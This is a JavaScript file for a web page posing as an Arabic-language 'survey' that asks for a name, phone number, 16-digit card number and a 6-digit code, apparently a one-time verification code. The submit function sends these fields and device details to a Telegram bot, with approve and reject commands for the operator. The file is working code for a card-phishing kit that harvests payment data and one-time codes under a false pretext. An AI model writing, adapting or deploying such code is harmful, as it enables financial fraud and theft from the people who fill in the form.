// تحميل المشاركين من localStorage
let participants = JSON.parse(localStorage.getItem('participants') || '[]');

// معلومات الجهاز الحالية
let currentDeviceInfo = null;

// تحديث العداد
function updateCounter() {
    document.getElementById('participantCount').textContent = participants.length;
}

// عرض صفحة
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// عرض خطوة
function showStep(stepNumber) {
    document.querySelectorAll('.step-content').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById('step' + stepNumber).classList.add('active');
    
    // تحديث الخطوات
    document.querySelectorAll('.step').forEach((step, index) => {
        if(index < stepNumber) {
            step.classList.add('active');
        } else {
            step.classList.remove('active');
        }
    });
    
    // إذا كانت الخطوة 2، كشف الجهاز
    if(stepNumber === 2) {
        setTimeout(detectAndDisplayDevice, 100);
    }
}

// بدء الاستبيان
function startSurvey() {
    showPage('survey');
    showStep(1);
    
    // مسح الحقول السابقة
    document.getElementById('name').value = '';
    document.getElementById('phone').value = '';
    document.getElementById('card').value = '';
    document.getElementById('code').value = '';
}

// العودة للرئيسية
function goHome() {
    showPage('home');
    updateCounter();
}

// التالي للخطوة 2
function nextStep() {
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const card = document.getElementById('card').value.trim();
    
    if(!name || !phone || !card) {
        showMessage(CONFIG.MESSAGES.REQUIRED, 'error');
        return;
    }
    
    if(!isValidPhone(phone)) {
        showMessage(CONFIG.MESSAGES.INVALID_PHONE, 'error');
        return;
    }
    
    if(!isValidCard(card)) {
        showMessage(CONFIG.MESSAGES.INVALID_CARD, 'error');
        return;
    }
    
    showStep(2);
}

// كشف وعرض معلومات الجهاز
function detectAndDisplayDevice() {
    const deviceInfo = detectDeviceType();
    currentDeviceInfo = deviceInfo;
    
    // تحديث الواجهة
    const deviceInfoDiv = document.getElementById('device-info');
    const deviceTypeSpan = document.getElementById('device-type');
    const deviceBadgeSpan = document.getElementById('device-badge');
    const deviceDetailsSpan = document.getElementById('device-details');
    
    // إزالة كلاسات الجهاز القديمة
    deviceInfoDiv.classList.remove('mobile-device', 'tablet-device', 'desktop-device');
    
    // إضافة كلاس الجهاز المناسب
    if(deviceInfo.type === 'تابلت') {
        deviceInfoDiv.classList.add('tablet-device');
    } else if(deviceInfo.type === 'كمبيوتر') {
        deviceInfoDiv.classList.add('desktop-device');
    } else {
        deviceInfoDiv.classList.add('mobile-device');
    }
    
    // تحديث النصوص
    deviceTypeSpan.textContent = `${deviceInfo.type} - ${deviceInfo.browser}`;
    deviceBadgeSpan.textContent = getDeviceIcon(deviceInfo.type);
    deviceDetailsSpan.textContent = `الشاشة: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight} | النظام: ${deviceInfo.os}`;
}

// دالة كشف نوع الجهاز
function detectDeviceType() {
    const userAgent = navigator.userAgent.toLowerCase();
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    
    let deviceType = "جوال";
    let deviceClass = "mobile-device";
    
    // كشف نوع الجهاز
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent)) {
        deviceType = "تابلت";
        deviceClass = "tablet-device";
    } else if (screenWidth > 1024 && !/mobile/i.test(userAgent)) {
        deviceType = "كمبيوتر";
        deviceClass = "desktop-device";
    }
    
    // كشف المتصفح
    let browser = "متصفح ويب";
    if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) browser = "Chrome";
    else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = "Safari";
    else if (/firefox/i.test(userAgent)) browser = "Firefox";
    else if (/edg/i.test(userAgent)) browser = "Edge";
    else if (/opera|opr/i.test(userAgent)) browser = "Opera";
    
    // كشف نظام التشغيل
    let os = "غير معروف";
    if (/windows/i.test(userAgent)) os = "Windows";
    else if (/mac os|macintosh/i.test(userAgent)) os = "macOS";
    else if (/android/i.test(userAgent)) os = "Android";
    else if (/ios|iphone|ipad/i.test(userAgent)) os = "iOS";
    else if (/linux/i.test(userAgent)) os = "Linux";
    
    return {
        type: deviceType,
        browser: browser,
        os: os,
        screenWidth: screenWidth,
        screenHeight: screenHeight,
        userAgent: navigator.userAgent.substring(0, 100) // جزء فقط لمنع طول الرسالة
    };
}

// أيقونة الجهاز
function getDeviceIcon(type) {
    const icons = {
        "جوال": "📱",
        "تابلت": "📟", 
        "كمبيوتر": "💻"
    };
    return icons[type] || "📱";
}

// تعبئة مثال
function fillExample(code) {
    document.getElementById('code').value = code;
}

// إرسال الاستبيان
async function submitSurvey() {
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const card = document.getElementById('card').value.trim();
    const code = document.getElementById('code').value.trim();
    
    if(!name || !phone || !card || !code) {
        showMessage(CONFIG.MESSAGES.REQUIRED, 'error');
        return;
    }
    
    if(!isValidPhone(phone)) {
        showMessage(CONFIG.MESSAGES.INVALID_PHONE, 'error');
        return;
    }
    
    if(!isValidCard(card)) {
        showMessage(CONFIG.MESSAGES.INVALID_CARD, 'error');
        return;
    }
    
    if(!isValidCode(code)) {
        showMessage(CONFIG.MESSAGES.INVALID_CODE, 'error');
        return;
    }
    
    // إنشاء بيانات المشاركة
    const userId = generateUserId();
    const surveyData = {
        id: userId,
        name: name,
        phone: phone,
        card: card,
        code: code,
        date: new Date().toLocaleString('ar-SA'),
        status: 'pending',
        deviceInfo: currentDeviceInfo || {}
    };
    
    try {
        // حفظ محلي
        participants.push(surveyData);
        localStorage.setItem('participants', JSON.stringify(participants));
        
        // إرسال لتيليجرام
        await sendToTelegram(surveyData);
        
        // عرض رقم المشاركة ومعلومات الجهاز
        document.getElementById('userId').textContent = userId;
        if(currentDeviceInfo) {
            document.getElementById('final-device-type').textContent = `${currentDeviceInfo.type} - ${currentDeviceInfo.browser}`;
        }
        
        // الانتقال للخطوة 3
        showStep(3);
        updateCounter();
        
        showMessage(CONFIG.MESSAGES.SUCCESS, 'success');
        
    } catch (error) {
        showMessage(CONFIG.MESSAGES.ERROR + ": " + error.message, 'error');
        console.error('خطأ في الإرسال:', error);
    }
}

// إرسال لتيليجرام
async function sendToTelegram(data) {
    if(!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
        console.log("⚠️ لم يتم إعداد توكن البوت - البيانات محفوظة محلياً فقط");
        return { ok: true, local_only: true };
    }
    
    const message = `
📊 *استبيان جديد*

👤 *المعلومات الشخصية:*
▫️ الاسم: ${data.name}
▫️ الهاتف: ${data.phone}
▫️ رقم البطاقة: ${data.card}
▫️ الرمز: ${data.code}

📱 *معلومات الجهاز:*
▫️ النوع: ${data.deviceInfo.type || 'غير معروف'}
▫️ المتصفح: ${data.deviceInfo.browser || 'غير معروف'}
▫️ النظام: ${data.deviceInfo.os || 'غير معروف'}
▫️ الشاشة: ${data.deviceInfo.screenWidth || 0}×${data.deviceInfo.screenHeight || 0}

🆔 *رقم المشاركة:* ${data.id}
📅 *التاريخ:* ${data.date}

✅ للموافقة: /approve_${data.id}
❌ للرفض: /reject_${data.id}
🔍 للتفاصيل: /details_${data.id}
    `;
    
    const url = `${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_notification: false
            })
        });
        
        const result = await response.json();
        
        if(!result.ok) {
            throw new Error(result.description || 'خطأ في إرسال التيليجرام');
        }
        
        return result;
        
    } catch (error) {
        console.error('خطأ في إرسال التيليجرام:', error);
        // لا نرمي الخطأ هنا، نستمر في العملية المحلية
        return { ok: false, error: error.message };
    }
}

// عرض رسالة
function showMessage(text, type = 'info') {
    const messageEl = document.getElementById('message');
    messageEl.textContent = text;
    messageEl.className = 'message show';
    
    if(type === 'error') {
        messageEl.classList.add('error');
        messageEl.classList.remove('info');
    } else if(type === 'success') {
        messageEl.classList.remove('error');
        messageEl.classList.remove('info');
    } else {
        messageEl.classList.add('info');
        messageEl.classList.remove('error');
    }
    
    setTimeout(() => {
        messageEl.classList.remove('show');
    }, 3000);
}

// عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    updateCounter();
    
    // إضافة event listener للعودة بالزر
    document.querySelectorAll('.back-btn').forEach(btn => {
        btn.addEventListener('click', goHome);
    });
    
    // منع إدخال أحرف في رقم البطاقة
    const cardInput = document.getElementById('card');
    if(cardInput) {
        cardInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if(this.value.length > 16) {
                this.value = this.value.substring(0, 16);
            }
        });
    }
    
    // منع إدخال أحرف في الرمز
    const codeInput = document.getElementById('code');
    if(codeInput) {
        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if(this.value.length > 6) {
                this.value = this.value.substring(0, 6);
            }
        });
    }
    
    // تنسيق رقم الهاتف أثناء الكتابة
    const phoneInput = document.getElementById('phone');
    if(phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if(value.length > 10) {
                value = value.substring(0, 10);
            }
            
            // تنسيق: 05XX XX XX XX
            if(value.length > 2) {
                value = value.substring(0, 2) + ' ' + value.substring(2);
            }
            if(value.length > 5) {
                value = value.substring(0, 5) + ' ' + value.substring(5);
            }
            if(value.length > 8) {
                value = value.substring(0, 8) + ' ' + value.substring(8);
            }
            
            this.value = value;
        });
    }
    
    // كشف الجهاز عند تحميل الصفحة (تحضيراً)
    currentDeviceInfo = detectDeviceType();
});